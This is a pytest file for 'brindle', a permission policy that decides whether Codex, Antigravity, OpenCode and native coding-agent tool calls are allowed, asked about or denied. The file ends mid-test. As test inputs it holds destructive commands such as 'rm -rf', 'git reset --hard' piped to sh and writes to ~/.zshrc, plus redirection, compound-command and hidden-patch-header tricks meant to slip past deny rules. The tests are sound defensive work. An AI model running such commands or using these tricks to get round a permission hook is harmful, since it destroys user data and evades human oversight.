"""The permission policy for Codex and Antigravity (agy) workers: their hook
payloads as brindle Requests, their answers, the one-time Codex hook trust, and
the copy of brindle's rules kept in agy's own settings."""

import asyncio
import hashlib
import json
import os
import time
from pathlib import Path

import pytest
from typer.testing import CliRunner

from brindle import agents, antigravity, codex_hook, permissions
from brindle.cli import app
from brindle.config import brindle_home, set_local
from brindle.db import Agent
from brindle.permissions import Rule, decide_all, from_codex
from workspace_template import copy_workspace, workspace_template  # noqa: F401 (a fixture)


@pytest.fixture
def ws(db, workspace_template, tmp_path, monkeypatch):
    monkeypatch.setattr("brindle.permissions.PRESET_RULES", ())
    return copy_workspace(workspace_template, db, tmp_path)


def worker(db, ws, provider="codex", id_="c1"):
    a = Agent(id_, ws.id, "developer", provider, "boss", "assign", "processing", f"%{id_}", None, time.time())
    db.add_agent(a)
    return a


def turn_on(ws):
    set_local(ws.repo_root, "permission_policy", "on")


def codex_payload(tool, tool_input, cwd):
    return {"session_id": "s", "turn_id": "t", "cwd": cwd, "hook_event_name": "PermissionRequest",
            "model": "m", "permission_mode": "default", "transcript_path": None,
            "tool_name": tool, "tool_input": tool_input}


# -- Codex: payload -> requests ----------------------------------------------------------------


def test_codex_bash_mcp_and_other(ws):
    [r] = from_codex(codex_payload("Bash", {"command": "git status", "description": None}, ws.path),
                     ws.path, ws.repo_root)
    assert (r.provider, r.kind, r.tool, r.command, r.cwd) == ("codex", "bash", "Bash", "git status", ws.path)
    [r] = from_codex(codex_payload("mcp__github__create_issue", {"title": "x"}, ws.path))
    assert (r.kind, r.tool) == ("mcp", "mcp__github__create_issue")
    [r] = from_codex(codex_payload("web_search", {}, ws.path))
    assert r.kind == "other"
    assert from_codex({"tool_input": {}}) is None
    [r] = from_codex(codex_payload("Bash", {"command": ["git", "log", "-1"]}, ws.path))
    assert r.command == "git log -1"


@pytest.mark.parametrize("patch,kind", [
    ("*** Begin Patch\n*** Update File: secret.py\n*** Move to: public.py\n@@\n-old\n+new\n*** End Patch\n", "edit"),
])
def test_codex_patch_rename_and_delete_preserve_source_deny(db, ws, patch, kind):
    a = worker(db, ws)
    turn_on(ws)
    permissions.add_rule("edit", "*", "allow", "glob")
    permissions.add_rule("write", "*", "allow", "glob")
    permissions.add_rule(kind, "secret.py", "deny")
    out = agents.hook_main(db, a.id, "codex-permission-request",
                          json.dumps(codex_payload("apply_patch", {"command": patch}, ws.path)))
    assert json.loads(out)["hookSpecificOutput"]["decision"]["behavior"] == "deny"


@pytest.mark.parametrize("patch", [
    pytest.param("*** Begin Patch\n*** Update File: a.py\n  *** Update File: /etc/hosts\n*** End Patch\n",
                 marks=pytest.mark.variant("unrecognized patch header must not hide a target path")),
    pytest.param("*** Begin Patch\n*** Update File: a.py\n*** update file: b.py\n*** End Patch\n",
                 marks=pytest.mark.variant("unrecognized patch header must not hide a target path")),
    "*** Begin Patch\n*** Update File: a.py\n***Update File: b.py\n*** End Patch\n",
])
def test_a_patch_with_a_header_brindle_cant_account_for_is_ask(ws, patch):
    # Codex's patch reader may accept a header brindle's doesn't (indented, other
    # case, no space): then brindle can't know every file it touches.
    reqs = from_codex(codex_payload("apply_patch", {"command": patch}, ws.path), ws.path, ws.repo_root)
    allow_all = [Rule("edit", "*", "glob", "allow"), Rule("write", "*", "glob", "allow")]
    assert decide_all(reqs, rules=allow_all).decision == "ask"


def test_a_patch_is_allowed_only_if_every_file_is(ws):
    two = "*** Begin Patch\n*** Update File: a.py\n*** Update File: b.py\n*** End Patch\n"
    reqs = from_codex(codex_payload("apply_patch", {"command": two}, ws.path), ws.path, ws.repo_root)
    allow_a = Rule("edit", "a.py", "exact", "allow")
    allow_b = Rule("edit", "b.py", "exact", "allow")
    deny_b = Rule("edit", "b.py", "exact", "deny")
    assert decide_all(reqs, rules=[allow_a, allow_b]).decision == "allow"
    assert decide_all(reqs, rules=[allow_a]).decision == "ask"
    assert decide_all(reqs, rules=[allow_a, deny_b]).decision == "deny"
    assert decide_all([], rules=[]).decision == "ask"


# -- Codex: the hook ---------------------------------------------------------------------------


def test_codex_hook_off_or_broken_is_no_output(db, ws, monkeypatch):
    a = worker(db, ws)
    payload = json.dumps(codex_payload("Bash", {"command": "git push"}, ws.path))
    assert agents.hook_main(db, a.id, "codex-permission-request", payload) == ""  # policy off
    covered = json.dumps(codex_payload("Bash", {"command": "git status"}, ws.path))
    assert agents.hook_main(db, a.id, "codex-permission-request", covered) == ""  # ...even in allowed_tools
    turn_on(ws)
    assert agents.hook_main(db, a.id, "codex-permission-request", "{not json") == ""
    assert agents.hook_main(db, a.id, "codex-permission-request", "[1, 2]") == ""
    # #298: attached-repo MCP calls must run for both supervisors and workers.
    db.add_agent(Agent("boss", ws.id, "supervisor", "codex", None, "interactive", "processing", "%b", None, time.time()))
    db.add_session_repo("boss", "lib", os.path.join(os.path.dirname(ws.path), "lib"))
    monkeypatch.setattr(agents, "_hold_for_app", lambda *args, **kwargs: None)
    for caller in (db.get_agent("boss"), a):
        for provider in ("claude", "codex"):
            for tool in ("assign", "handoff", "workspace_diff", "merge_workspace", "request_review", "remove_workspace"):
                mcp_payload = codex_payload(f"mcp__brindle__{tool}", {"repo": "lib", "workspace": "feature"}, ws.path)
                answer = agents.permission_request_decision(db, caller, mcp_payload, provider)
                assert answer is not None and answer["hookSpecificOutput"]["decision"]["behavior"] == "allow"

    def boom(*a, **k):
        raise RuntimeError("broken")

    monkeypatch.setattr(permissions, "decide_all", boom)
    assert agents.hook_main(db, a.id, "codex-permission-request", payload) == ""


@pytest.mark.parametrize("provider,command,expected", [
    pytest.param("codex", "make verify", "allow",
                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # repo check
    pytest.param("codex", "task test unit", "allow",
                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # profile prefix allowance
    ("codex", "task test unit && deploy", None),
    pytest.param("codex", "task test secret", "deny",
                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # profile deny beats profile allow
    pytest.param("codex", "cd {ws} && task test secret", "deny",
                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # ...in every part of a compound command too
    pytest.param("codex", "task test secret 2>&1", "deny",
                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # ...as the allow reads the part, redirection dropped
    pytest.param("codex", 'task test "" secret', "deny",
                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # ...and an empty word doesn't hide it
    ("claude", "task test secret", "deny"),  # a profile restriction beats Claude's profile allow
    pytest.param("claude", "task test prod", "deny",
                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # an org restriction too
])
def test_codex_checks_and_profile_commands(db, ws, monkeypatch, provider, command, expected):
    from pathlib import Path

    turn_on(ws)
    set_local(ws.repo_root, "checks", ["make verify", "make blocked"])
    profiles = Path(ws.repo_root) / ".brindle" / "agents"
    profiles.mkdir(parents=True, exist_ok=True)
    (profiles / "developer.md").write_text(
        '---\nname: developer\n'
        'allowed_tools: [Bash(just lint), Bash(task test:*), Bash(git push:*)]\n'
        'permission_denies: ["bash exact task test secret"]\n---\n'
    )
    permissions.repo_rules_path(ws.repo_root).write_text(json.dumps({"rules": [
        Rule("bash", "make blocked", "exact", "deny").to_dict()]}))
    a = worker(db, ws, provider=provider)
    if provider == "claude":
        from brindle import permission_grants
        from brindle.pro.team_policy import GrantPolicy, OrgPolicy
        from types import SimpleNamespace

        monkeypatch.setattr(permission_grants, "_plugin", lambda repo: SimpleNamespace(policy=lambda: OrgPolicy(
            "org", 1, permission_grants=GrantPolicy(True, ("bash",), (), 5, 1,
                                                  deny=("bash prefix task test prod",)))))
        out = agents.pre_tool_decision(db, a, {"tool_name": "Bash", "tool_input": {"command": command}})
        assert out["hookSpecificOutput"]["permissionDecision"] == expected
        return
    out = agents.hook_main(db, a.id, "codex-permission-request",
                          json.dumps(codex_payload("Bash", {"command": command.format(ws=ws.path)}, ws.path)))
    assert (json.loads(out)["hookSpecificOutput"]["decision"]["behavior"] if out else None) == expected


@pytest.mark.variant("providers without a prompt must fail closed on explicit asks")
def test_codex_dontask_turns_ask_into_deny(db, ws, monkeypatch):
    turn_on(ws)
    command = "uv run python - <<'PY'\nimport os; os.remove('x')\nPY"
    assert codex_behavior(db, ws, "reviewer-codex", command) == "deny"
    a = worker(db, ws)
    with permissions.editing() as store:
        store.rules = [Rule("bash", "uv run", "prefix", "ask")]
    monkeypatch.setattr(agents, "_hold_for_app", lambda *a, **kw: None)
    out = agents.hook_main(db, a.id, "codex-permission-request", json.dumps(
        codex_payload("Bash", {"command": "uv run pytest tests/test_x.py"}, ws.path)))
    assert out == ""
    agy = antigravity.pre_tool_decision(db, a.id, agy_payload(
        "run_command", {"CommandLine": "uv run pytest tests/test_x.py"}, ws.path), strict=True)
    assert agy["decision"] == "deny"
    # OpenCode cannot prompt from its before-tool hook: explicit asks must
    # block until approved, rather than pass through its own allow rules.
    answer = agents.permission_request_decision(db, a, {
        "tool": "bash", "args": {"command": "uv run pytest tests/test_x.py"}}, provider="opencode")
    assert answer["decision"] == "deny"
    pre = agents.pre_tool_decision(db, a, {
        "tool_name": "Bash", "tool_input": {"command": "uv run pytest tests/test_x.py"}})
    assert pre["hookSpecificOutput"]["permissionDecision"] == "ask"
    with permissions.editing() as store:
        store.rules = [Rule("bash", "uv run", "prefix", "deny")]
    pre = agents.pre_tool_decision(db, a, {
        "tool_name": "Bash", "tool_input": {"command": "uv run pytest tests/test_x.py"}})
    assert pre["hookSpecificOutput"]["permissionDecision"] == "deny"


@pytest.mark.parametrize("match_type,decision,command", [
    pytest.param("prefix", "ask", "echo ok && deploy prod > out",
                 marks=pytest.mark.variant("compound native dispatch must not widen a prefix approval")),
    pytest.param("exact", "ask", "echo ok && deploy prod > out", marks=pytest.mark.variant("compound exact ask bypass")),
    pytest.param("exact", "deny", "deploy prod > out", marks=pytest.mark.variant("direct exact deny bypass")),
    ("exact", "ask", "deploy prod >"),
    pytest.param("exact", "ask", "deploy 2>out prod", marks=pytest.mark.variant("redirection inside command arguments")),
    pytest.param("exact", "ask", "deploy prod >>out", marks=pytest.mark.variant("attached append redirection")),
    pytest.param("exact", "ask", 'deploy prod > "$OUT"', marks=pytest.mark.variant("unresolved redirect target expansion")),
    pytest.param("exact", "ask", "deploy  prod", marks=pytest.mark.variant("repeated-space explicit ask bypass")),
    pytest.param("exact", "ask", "REGION=us deploy prod", marks=pytest.mark.variant("assignment explicit ask bypass")),
])
def test_native_dispatch_enforces_saved_rules_with_workspace_identity(db, ws, monkeypatch, match_type, decision, command):
    from brindle.native.permissions import Permissions
    from brindle.native.loop import NativeAgent
    from brindle.native.client import ToolCall
    from brindle.native.tools import Toolbox, Tool, ToolResult
    from brindle.native.runner import permission_decision
    from brindle import permission_grants

    turn_on(ws)
    agent = worker(db, ws, provider="native")
    with permissions.editing() as store:
        store.rules = [Rule("bash", "deploy" if match_type == "prefix" else "deploy prod",
                            match_type, decision, repo_root=ws.repo_root)]
    ran = []
    def execute(args):
        ran.append(args)
        return ToolResult("done")

    toolbox = Toolbox().add(Tool("Bash", "", {}, execute))
    policy = Permissions("bypassPermissions", [])
    loop = NativeAgent(None, toolbox, policy, "", policy=lambda tool, args: permission_decision(
        db, agent.id, ws, tool, args))
    for mode in ("bypassPermissions", "default"):
        policy.mode = mode
        policy.rules = [("Bash", None)]
        assert permission_decision(db, agent.id, ws, "Bash", {"command": command}) == decision
        assert loop._execute(ToolCall("call", "Bash", {"command": "deploy prod"})).is_error
        assert loop._execute(ToolCall("redirect", "Bash", {"command": command})).is_error
    assert not ran
    if match_type == "exact":
        literal = {"command": "deploy 'prod > out'"}
        assert not loop._execute(ToolCall("literal", "Bash", literal)).is_error
        assert ran == [literal]
        ran.clear()
    policy.rules = []
    with permissions.editing() as store:
        store.rules = [Rule("bash", "deploy", "prefix", "allow", repo_root=ws.repo_root)]
    policy.mode = "dontAsk"
    assert not loop._execute(ToolCall("allowed", "Bash", {"command": "deploy dev"})).is_error
    assert ran == [{"command": "deploy dev"}]
    monkeypatch.setattr(permission_grants, "org_limits", lambda root: permission_grants.OrgLimits(
        True, deny=(Rule("bash", "deploy", "prefix", "deny", "org"),)))
    policy.mode = "bypassPermissions"
    assert loop._execute(ToolCall("blocked", "Bash", {"command": "deploy dev"})).is_error
    assert len(ran) == 1
    if match_type == "prefix":
        policy.mode, policy.rules = "dontAsk", [("Bash", "git diff:*")]
        for revision in ("main...HEAD", "HEAD~1..HEAD", "HEAD^..HEAD"):
            args = {"command": f"git diff {revision}"}
            assert permission_decision(db, agent.id, ws, "Bash", args) is None
            assert not loop._execute(ToolCall("fallback", "Bash", args)).is_error
            assert ran[-1] == args


@pytest.mark.parametrize("provider", [pytest.param("opencode",
                 marks=pytest.mark.variant("provider adapter must honor current denies over saved approvals")), pytest.param("antigravity",
                 marks=pytest.mark.variant("provider adapter must honor current denies over saved approvals")), "native"])
def test_before_tool_adapters_honor_saved_actions_and_current_denies(db, ws, monkeypatch, provider):
    from pathlib import Path
    from brindle import permission_grants

    turn_on(ws)
    a = worker(db, ws, provider=provider)
    secret, path = Path(ws.path) / ".env", Path(ws.path) / "notes.txt"
    secret.write_text("fixture")
    path.write_text("fixture")
    if provider == "native":
        from brindle.native import runner
        from brindle.native.client import Endpoint, ToolCall

        loops, constructor = [], runner.NativeAgent
        def capture_loop(*args, **kwargs):
            loop = constructor(*args, **kwargs)
            loops.append(loop)
            return loop

        monkeypatch.setattr(runner, "NativeAgent", capture_loop)
        monkeypatch.setattr(runner, "endpoint_for", lambda profile: Endpoint("http://unused", "fixture"))
        monkeypatch.setattr(runner, "Client", lambda *args, **kwargs: None)
        assert runner.run_native(db, a.id, exit_when_idle=True) == 0

    def decision(file=path):
        if provider == "native":
            result = loops[0]._execute(ToolCall("read", "Read", {"path": str(file)}))
            return "deny" if result.is_error else "allow"
        if provider == "opencode":
            result = agents.permission_request_decision(db, a, {
                "tool": "read", "args": {"filePath": str(file)}}, provider=provider)
            return result["decision"] if result else "allow"
        return antigravity.pre_tool_decision(db, a.id, agy_payload(
            "view_file", {"AbsolutePath": str(file)}, ws.path), strict=True)["decision"]

    # The preset's deny holds, whatever the person saved.
    assert decision(secret) == "deny"
    permissions.save_action("read", ".env", "allow")
    assert decision(secret) == "deny"
    allow = permissions.add_rule("read", "notes.txt", "allow")
    assert decision() == "allow"
    if provider == "antigravity":
        ambiguous = agy_payload("view_file", {
            "AbsolutePath": str(path), "TargetFile": str(secret)}, ws.path)
        assert antigravity.pre_tool_decision(db, a.id, ambiguous, strict=True)["decision"] == "deny"
    saved = permissions.save_action("read", "notes.txt", "deny")
    assert decision() == "deny"    # a saved deny stops what a rule allows
    permissions.delete_saved_action(saved.id)
    assert decision() == "allow"
    monkeypatch.setattr(permission_grants, "org_limits", lambda root: permission_grants.OrgLimits(
        True, deny=(Rule("read", "*notes.txt", "glob", "deny", "org"),)))
    assert decision() == "deny"    # the org's denies hold for every provider
    permissions.forget(allow.id)


@pytest.mark.parametrize("policy,command,expected", [
    pytest.param("on", "gh issue view 239 --repo PawDelta/brindle", "allow",
                 marks=pytest.mark.variant("reviewer GitHub read allowance must not authorize writes")),
    pytest.param("on", "gh pr diff 5 --repo PawDelta/brindle", "allow",
                 marks=pytest.mark.variant("each read-only gh subcommand is its own allow rule")),
    pytest.param("on", "gh pr merge 5 --repo PawDelta/brindle", "deny",
                 marks=pytest.mark.variant("reviewer GitHub read allowance must not authorize writes")),  # dontAsk: writes stay refused
    pytest.param("on", "gh api -X POST repos/PawDelta/brindle/issues", "deny",
                 marks=pytest.mark.variant("gh api writes are a distinct bypass attempt")),
    ("off", "gh issue view 239 --repo PawDelta/brindle", "allow"),  # #241: nobody watches its prompt
    pytest.param("off", "gh pr merge 5 --repo PawDelta/brindle", None,
                 marks=pytest.mark.variant("reviewer GitHub read allowance must not authorize writes")),  # ...the rest stays Codex's own
    pytest.param("on", "git diff --stat && uv run pytest tests/test_feature.py -q", "allow",
                 marks=pytest.mark.variant("#250: reviewer read and local test probes use the existing policy")),
])
def test_codex_reviewer_reads_github_but_cannot_write(db, ws, policy, command, expected):
    set_local(ws.repo_root, "permission_policy", policy)
    a = Agent("r1", ws.id, "reviewer-codex", "codex", "boss", "review", "processing", "%r1", None, time.time())
    db.add_agent(a)
    out = agents.hook_main(db, a.id, "codex-permission-request",
                          json.dumps(codex_payload("Bash", {"command": command}, ws.path)))
    assert (json.loads(out)["hookSpecificOutput"]["decision"]["behavior"] if out else None) == expected


@pytest.mark.parametrize("command,expected", [("git push --force", "deny")])
def test_codex_session_bookkeeping_failure_preserves_decision(db, ws, monkeypatch, command, expected):
    a = worker(db, ws)
    turn_on(ws)

    def boom(*args, **kwargs):
        raise RuntimeError("session write failed")

    monkeypatch.setattr(db, "update_agent", boom)
    out = agents.hook_main(db, a.id, "codex-permission-request",
                          json.dumps(codex_payload("Bash", {"command": command}, ws.path)))
    assert json.loads(out)["hookSpecificOutput"]["decision"]["behavior"] == expected


def test_codex_unknown_and_failed_resolution_leave_approval(db, ws, monkeypatch):
    a = worker(db, ws)
    turn_on(ws)
    payload = json.dumps(codex_payload("unknown_tool", {}, ws.path))
    assert agents.hook_main(db, a.id, "codex-permission-request", payload, trusted=False) == ""

    def boom(*args, **kwargs):
        raise RuntimeError("lookup failed")

    monkeypatch.setattr(agents, "agent_for_session", boom)
    assert agents.hook_main(db, a.id, "codex-permission-request", payload, trusted=False) == ""


@pytest.mark.variant("a known denied path must beat an unknown patch header")
def test_codex_patch_unknown_header_cannot_hide_a_known_deny(ws):
    patch = "*** Begin Patch\n*** Update File: denied.py\n*** Rename File: mystery.py\n*** End Patch\n"
    reqs = from_codex(codex_payload("apply_patch", {"command": patch}, ws.path), ws.path, ws.repo_root)
    rules = [Rule("edit", "*", "glob", "allow"), Rule("edit", "denied.py", "exact", "deny")]
    assert decide_all(reqs, rules=rules).decision == "deny"


def codex_behavior(db, ws, profile, command):
    a = Agent(f"c-{profile}", ws.id, profile, "codex", "boss", "assign", "processing", "%c", None, time.time())
    db.add_agent(a)
    out = agents.hook_main(db, a.id, "codex-permission-request",
                           json.dumps(codex_payload("Bash", {"command": command}, ws.path)))
    return json.loads(out)["hookSpecificOutput"]["decision"]["behavior"] if out else None


@pytest.mark.parametrize("command,expected", [
    pytest.param("cd {ws} && git status", "allow",
                 marks=pytest.mark.variant("Codex hook must recognize covered read commands without prompting")),
    pytest.param('grep -rn "x" .', "allow",
                 marks=pytest.mark.variant("Codex hook must recognize covered read commands without prompting")),
    pytest.param("git log |& rm -rf x", None, marks=pytest.mark.variant("shlex reads |& as one word")),
    pytest.param("ls > ~/.zshrc", None, marks=pytest.mark.variant("redirection shlex doesn't split")),
])
def test_codex_compound_command_covered_is_allowed(db, ws, command, expected):
    turn_on(ws)
    assert codex_behavior(db, ws, "developer-codex", command.format(ws=ws.path)) == expected


@pytest.mark.variant("a worktree executable must not replace the installed permission hook")
def test_hook_invocation_skips_worktree_python(ws, monkeypatch, tmp_path):
    # The worktree venv's own bin (where its brindle lives) comes first on
    # PATH, as it does under `uv run`: the installed brindle further on wins.
    from brindle import providers

    venv_bin = os.path.join(ws.path, ".venv", "bin")
    installed_bin = tmp_path / "installed" / "bin"
    for d in (venv_bin, installed_bin):
        os.makedirs(d, exist_ok=True)
        exe = os.path.join(d, "brindle")
        with open(exe, "w") as f:
            f.write("#!/bin/sh\n")
        os.chmod(exe, 0o755)
    monkeypatch.setattr("sys.executable", os.path.join(venv_bin, "python"))
    monkeypatch.setenv("PATH", os.pathsep.join([venv_bin, str(installed_bin)]))
    assert providers.brindle_invocation() == [str(installed_bin / "brindle")]


def test_codex_hook_cli_finds_its_agent_in_the_environment(db, ws, monkeypatch):
    a = worker(db, ws)
    turn_on(ws)
    monkeypatch.setenv("BRINDLE_AGENT_ID", a.id)
    res = CliRunner().invoke(app, ["_hook", "codex-permission-request"],
                             input=json.dumps(codex_payload("Bash", {"command": "git push --force"}, ws.path)))
    assert res.exit_code == 0
    assert json.loads(res.output)["hookSpecificOutput"]["decision"]["behavior"] == "deny"
    res = CliRunner().invoke(app, ["_hook", "codex-permission-request"], input="garbage")
    assert res.exit_code == 0 and res.output == ""


# -- Codex: trusting the hook once -----------------------------------------------------------


def test_codex_app_server_uses_local_protocol_and_ignores_notifications(monkeypatch):
    from io import StringIO

    # initialize + hooks/list shapes observed from local codex-cli 0.162.1.
    command = "brindle _hook codex-permission-request"
    hook = {"key": "/<session-flags>/config.toml:permission_request:0:0",
            "eventName": "permissionRequest", "handlerType": "command", "command": command,
            "async": False, "matcher": None, "timeoutSec": 30, "source": "sessionFlags",
            "enabled": True, "isManaged": False, "currentHash": "sha256:abc", "trustStatus": "modified"}
    pre = {**hook, "key": "/<session-flags>/config.toml:pre_tool_use:0:0", "eventName": "preToolUse",
           "command": "brindle _hook codex-pre-tool", "matcher": codex_hook.PRE_TOOL_MATCHER,
           "currentHash": "sha256:def", "trustStatus": "untrusted"}
    messages = [
        {"id": 1, "result": {"userAgent": "brindle/0.162.1", "platformFamily": "unix"}},
        {"method": "account/updated", "params": {"authMode": "chatgpt"}},
        {"id": 2, "result": {"data": [{"cwd": "/", "hooks": [pre, hook], "warnings": [], "errors": []}]}},
    ]
    proc = _fake_codex_process(monkeypatch, StringIO("\n".join(json.dumps(m) for m in messages)))
    state = codex_hook.inspect("codex", command)
    assert (state.command, state.key, state.hash, state.status, state.pre_key, state.pre_hash) == (
        command, hook["key"], "sha256:abc", "modified", pre["key"], "sha256:def")
    sent = [json.loads(line) for line in proc.stdin.getvalue().splitlines()]
    assert [m["method"] for m in sent] == ["initialize", "initialized", "hooks/list"]
    assert proc.killed and proc.waited
    assert proc.env["CODEX_HOME"] == str(codex_hook.codex_home())   # the home whose trust it lists


def _fake_codex_process(monkeypatch, stdout):
    from io import StringIO
    from types import SimpleNamespace

    proc = SimpleNamespace(stdin=StringIO(), stdout=stdout, killed=False, waited=False, env=None)

    def kill():
        proc.killed = True

    def wait(**kwargs):
        proc.waited = True
        return 0

    def popen(*a, env=None, **kw):
        proc.env = env
        return proc

    proc.kill, proc.wait = kill, wait
    monkeypatch.setattr(codex_hook.subprocess, "Popen", popen)
    return proc


@pytest.mark.parametrize("response,error", [
    ('{"id":1,"error":{"message":"unsupported"}}\n', "unsupported"),
    ('{"id":1,"result":[]}\n', "invalid result"),
])
def test_codex_app_server_initialization_failure_reaps_child(monkeypatch, response, error):
    from io import StringIO

    proc = _fake_codex_process(monkeypatch, StringIO(response))
    with pytest.raises(codex_hook.CodexHookError, match=error):
        codex_hook._AppServer("codex", [])
    assert proc.killed and proc.waited


def test_codex_app_server_notifications_do_not_reset_deadline(monkeypatch):
    from io import StringIO

    proc = _fake_codex_process(monkeypatch, StringIO('null\n{"method":"notice"}\n' * 10))
    ticks = iter(range(20))
    monkeypatch.setattr(codex_hook.time, "monotonic", lambda: next(ticks))
    with pytest.raises(codex_hook.CodexHookError, match="didn't answer initialize"):
        codex_hook._AppServer("codex", [], timeout=3)
    assert proc.killed and proc.waited


def test_codex_app_server_silent_reader_cannot_block_rpc_deadline(monkeypatch):
    import threading

    released = threading.Event()

    class SilentStdout:
        def __iter__(self):
            # Simulate a pipe that never produces a newline. Bound even the
            # fake reader's wait so a regression cannot hang the test runner.
            released.wait(2)
            return iter(())

    proc = _fake_codex_process(monkeypatch, SilentStdout())
    kill = proc.kill

    def release_reader():
        kill()
        released.set()

    proc.kill = release_reader
    with pytest.raises(codex_hook.CodexHookError, match="didn't answer initialize"):
        codex_hook._AppServer("codex", [], timeout=0.05)
    assert released.is_set() and proc.killed and proc.waited


def hook_command_of(flag):
    """The command in a ``-c hooks.<Event>=...`` definition."""
    import re

    return json.loads(re.search(r'command=("(?:[^"\\]|\\.)*")', flag).group(1))


class FakeAppServer:
    """Stands in for `codex app-server`: lists brindle's hook, and stores trust
    the way Codex does (config.toml hooks.state)."""
    calls: list = []
    system_config = "/nonexistent/etc/codex/config.toml"   # Codex's system layer (/etc/codex)

    def __init__(self, binary, flags, timeout=30.0):
        self.flags = flags

    def call(self, method, params):
        FakeAppServer.calls.append((method, params))
        config = codex_hook.codex_home() / "config.toml"
        if method == "hooks/list":
            hooks = []
            for flag in self.flags[1::2]:
                # Like Codex's, the hash covers the hook's whole definition (command, timeout).
                current = "sha256:" + hashlib.sha256(flag.encode()).hexdigest()
                trusted = config.exists() and current in config.read_text()
                event = {"PermissionRequest": "permission_request", "PreToolUse": "pre_tool_use"}[
                    flag.split("=", 1)[0].removeprefix("hooks.")]
                hooks.append({"key": f"/<session-flags>/config.toml:{event}:0:0", "source": "sessionFlags",
                              "command": hook_command_of(flag),
                              "currentHash": current, "trustStatus": "trusted" if trusted else "untrusted"})
            return {"data": [{"cwd": "/", "errors": [], "warnings": [], "hooks": hooks}]}
        if method == "config/batchWrite":
            [edit] = params["edits"]
            config.parent.mkdir(parents=True, exist_ok=True)
            # An upsert: the person's own settings above stay, and so does what an entry already says (enabled).
            import tomllib

            text = config.read_text() if config.exists() else ""
            entries = tomllib.loads(text).get("hooks", {}).get("state", {})
            for key, value in edit["value"].items():
                entries[key] = {**entries.get(key, {}), **value}
            config.write_text(text.split("[hooks.state.", 1)[0] + "".join(
                f'[hooks.state."{key}"]\n' + "".join(f"{k} = {json.dumps(v)}\n" for k, v in entry.items())
                for key, entry in entries.items()))
            return {"status": "ok"}
        if method == "config/read":
            # Like Codex's: every layer, highest precedence first, a project
            # layer listed (with a disabledReason) even before its folder is trusted.
            import tomllib

            found = [({"type": "project", "dotCodexFolder": os.path.join(params["cwd"], ".codex")},
                      os.path.join(params["cwd"], ".codex", "config.toml")),
                     ({"type": "user", "file": str(config), "profile": None}, str(config)),
                     ({"type": "system", "file": str(self.system_config)}, str(self.system_config))]
            return {"config": {}, "origins": {}, "layers": [
                {"name": name, "version": "", "config": tomllib.loads(Path(path).read_text())}
                for name, path in found if os.path.exists(path)]}
        raise AssertionError(method)

    def close(self):
        pass


def test_install_codex_hook_dry_run_then_yes(monkeypatch):
    FakeAppServer.calls = []
    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)
    r = CliRunner()
    res = r.invoke(app, ["permissions", "install-codex-hook"])
    assert res.exit_code == 0, res.output
    assert 'hooks.state."/<session-flags>/config.toml:permission_request:0:0"' in res.output
    assert "run again with --yes" in res.output
    assert not (codex_hook.codex_home() / "config.toml").exists()
    assert permissions.load_store().codex_hook == {}
    assert [m for m, _ in FakeAppServer.calls] == ["hooks/list"]

    res = r.invoke(app, ["permissions", "install-codex-hook", "--yes"])
    assert res.exit_code == 0, res.output
    assert "trusted" in res.output
    [(home, rec)] = permissions.load_store().codex_hook.items()
    assert home == os.path.realpath(codex_hook.codex_home())
    flags = codex_hook.config_flags()
    assert rec == {"command": codex_hook.hook_command(),
                   "key": "/<session-flags>/config.toml:permission_request:0:0",
                   "hash": "sha256:" + hashlib.sha256(flags[1].encode()).hexdigest(),
                   "pre_key": "/<session-flags>/config.toml:pre_tool_use:0:0",
                   "pre_hash": "sha256:" + hashlib.sha256(flags[3].encode()).hexdigest(),
                   "definition": codex_hook.definition()}
    assert codex_hook.trusted()
    assert "already trusted" in r.invoke(app, ["permissions", "install-codex-hook"]).output


def launch_argv(ws, mode=None, env=None):
    from brindle.profiles import load_profile
    from brindle.providers import Codex, LaunchContext

    profile = load_profile("developer")
    if env is not None:
        profile.env = {**(profile.env or {}), **env}
    return Codex().command(LaunchContext("c1", profile, None, cwd=ws.path, mode=mode))


@pytest.mark.parametrize("mode, profile_path, base", [
    pytest.param(None, None, "/usr/bin",
                 marks=pytest.mark.variant("absent PATH must fall back safely without a worktree venv")),
    pytest.param(None, "/opt/bin", "/opt/bin",
                 marks=pytest.mark.variant("PR #288: profile PATH takes precedence over the inherited PATH")),
    pytest.param(None, "", "",
                 marks=pytest.mark.variant("PR #288: explicit empty profile PATH must not restore inherited executables")),
    ("review", None, "/usr/bin"),
])
def test_codex_launch_venv_path(ws, monkeypatch, mode, profile_path, base):
    """uv panics under Codex's macOS sandbox, so the worktree's .venv/bin leads
    PATH for `python -m pytest`, on top of the profile's PATH when it sets one
    (even an empty one)."""
    monkeypatch.setenv("PATH", "/usr/bin")
    env = None if profile_path is None else {"PATH": profile_path}
    assert not any("shell_environment_policy.set.PATH" in a for a in launch_argv(ws, mode, env))
    venv_bin = os.path.join(ws.path, ".venv", "bin")
    os.makedirs(venv_bin)
    want = os.pathsep.join(p for p in (venv_bin, base) if p)
    assert f"shell_environment_policy.set.PATH={json.dumps(want)}" in launch_argv(ws, mode, env)



def test_codex_launch_trusts_and_passes_the_hook_when_the_policy_is_on(ws, monkeypatch):
    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)
    FakeAppServer.calls = []
    flag = codex_hook.config_flags()[1]
    assert flag not in launch_argv(ws)  # off: nothing trusted, nothing passed
    assert flag not in launch_argv(ws, mode="review")  # ...not even to a reviewer (#241)
    assert codex_hook.status() == codex_hook.NEW and FakeAppServer.calls == []
    turn_on(ws)
    a = launch_argv(ws)  # on: brindle trusts its own hook the first time
    assert a[a.index(flag) - 1] == "-c"
    assert "--agent" not in flag  # one command for every agent: one trust
    assert codex_hook.status() == codex_hook.TRUSTED
    set_local(ws.repo_root, "permission_policy", "off")
    assert flag in launch_argv(ws, mode="review")  # off, but trusted: a reviewer has it
    assert flag not in launch_argv(ws)  # a worker doesn't: permission_policy is the only switch


def _sandboxed(command):
    return pytest.param("standard", command, "deny", marks=pytest.mark.variant(
        "live release simulation: ran in a Codex worker's sandbox, which never asked brindle"))


@pytest.mark.parametrize("preset,command,expected", [
    pytest.param("autonomous", "echo 'git reset --hard' | sh", "deny",
